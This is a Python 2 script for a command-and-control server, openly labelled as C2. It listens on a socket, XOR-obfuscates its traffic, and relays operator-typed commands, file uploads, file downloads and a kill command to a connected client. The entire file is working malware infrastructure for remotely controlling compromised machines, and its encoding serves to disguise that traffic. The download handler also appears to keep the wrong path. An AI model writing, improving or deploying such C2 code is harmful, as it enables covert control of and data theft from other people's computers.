import socket

HOST = 'localhost'
PORT = 35001

def xor(message):
    newMessage = ""
    for char in message:
	deChar = ord(char) ^ ord('[')
        newMessage += str(unichr(deChar))
    return newMessage

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)

while True:
    conn, addr = sock.accept()
    print ('Connected by '+str(addr))

    conn.sendall(xor("connected to C2 server\n"))
    data = conn.recv(1024)
    print (xor(data))

    while True:
        data = raw_input("enter command: ")
        if data == "kill":
            conn.sendall(xor("kill"))
            conn.close()
            break
        elif "upload" in data.lower():
            # syntax: upload /path/to/file/to/upload
            # file will go to client's  current working directory
            data = xor(data)
            conn.sendall(data)
            rec = conn.recv(1024)
            print(xor(rec))
        elif "download" in data.lower():
            # syntax: download /remote/path/to/file/to/download /local/path
            # file will go to server's current working directory
            
            command = data.split(' ')

            if len(command) != 3:
                print("Incorrect download syntax")
                continue
                
            destinationPath = command.pop(1)
            print("Writing file to {}".format(destinationPath))
            data = ' '.join(command)
            data = xor(data)
            conn.sendall(data)
            rec = conn.recv(1024)
            print(xor(rec))
        else:
            data = xor(data)
            conn.sendall(data)
            rec = conn.recv(1024)
            print(xor(rec))

